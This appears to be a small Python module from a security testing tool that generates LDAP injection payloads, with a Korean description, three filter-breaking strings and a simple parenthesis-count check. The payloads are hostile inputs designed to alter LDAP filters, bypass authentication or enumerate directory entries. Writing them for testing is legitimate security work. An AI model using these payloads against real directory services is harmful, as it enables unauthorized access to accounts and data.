from typing import List

class LDAPInjectionModule:
    def __init__(self):
        self.name = "LDAP Injection"
        self.description = "LDAP 주입 페이로드 생성"

    def generate_payloads(self) -> List[str]:
        return [
            "*",
            "*)(|(uid=*",
            "admin*)(&(uid=*",
        ]

    def test_filter_syntax(self, f: str) -> bool:
        return f.count('(') == f.count(')')
